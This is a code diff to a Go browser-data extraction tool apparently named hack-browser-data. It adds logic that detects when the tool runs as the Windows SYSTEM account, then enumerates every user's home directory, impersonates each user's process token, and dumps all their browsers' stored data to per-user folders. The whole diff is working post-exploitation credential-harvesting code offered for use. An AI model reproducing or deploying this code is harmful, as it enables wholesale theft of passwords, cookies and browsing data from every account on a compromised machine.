@@ -1,8 +1,11 @@
 package main
 
 import (
+	"fmt"
 	"os"
+	"os/user"
 
+	enumUserHomesWhileSystem "github.com/sh3d0ww01f/enumUserHomesWhileSystem/EnumUsersHomes"
 	"github.com/urfave/cli/v2"
 
 	"github.com/moond4rk/hackbrowserdata/browser"
@@ -20,10 +23,37 @@ var (
 	isFullExport bool
 )
 
+func checkisSystem() bool {
+	currentUser, err := user.Current()
+	if err != nil {
+		return false
+	}
+	if currentUser.Username == "NT AUTHORITY\\SYSTEM" || currentUser.Username == "SYSTEM" {
+		return true
+	} else {
+		return false
+	}
+
+}
 func main() {
 	Execute()
 }
+func dodo() {
+	browsers, err := browser.PickBrowsers(browserName, profilePath)
+	if err != nil {
+		log.Error(err)
+	}
 
+	for _, b := range browsers {
+
+		data, err := b.BrowsingData(isFullExport)
+		if err != nil {
+			log.Error(err)
+			continue
+		}
+		data.Output(outputDir, b.Name(), outputFormat)
+	}
+}
 func Execute() {
 	app := &cli.App{
 		Name:      "hack-browser-data",
@@ -44,22 +74,43 @@ func Execute() {
 			if verbose {
 				log.SetVerbose()
 			}
-			browsers, err := browser.PickBrowsers(browserName, profilePath)
-			if err != nil {
-				log.Error(err)
-			}
+			//检查是否是nt/system权限
+			if checkisSystem() {
 
-			for _, b := range browsers {
-				data, err := b.BrowsingData(isFullExport)
+				result, pids, err := enumUserHomesWhileSystem.GetUserHomes()
 				if err != nil {
-					log.Error(err)
-					continue
+					return nil
+				} else {
+					for username, UserHome := range result {
+						fmt.Printf("username:%s userhome [pid:%d]:%s\n", username, pids[username], UserHome)
+						enumUserHomesWhileSystem.ImpersonateProcessToken(pids[username])
+						browser.MakeUserFile(UserHome, "")
+						//默认获取所有用户的xx浏览器
+						browsers, err := browser.PickBrowsers(browserName, "")
+						if err != nil {
+							log.Error(err)
+						}
+						for _, b := range browsers {
+
+							data, err := b.BrowsingData(isFullExport)
+
+							if err != nil {
+								log.Error(err)
+								continue
+							}
+							//输出到文件夹
+							data.Output(outputDir+"/"+username, b.Name(), outputFormat)
+						}
+						enumUserHomesWhileSystem.RevertToSelf()
+
+					}
 				}
-				data.Output(outputDir, b.Name(), outputFormat)
+			} else {
+				dodo()
 			}
 
 			if compress {
-				if err = fileutil.CompressDir(outputDir); err != nil {
+				if err := fileutil.CompressDir(outputDir); err != nil {
 					log.Error(err)
 				}
 				log.Noticef("compress success")
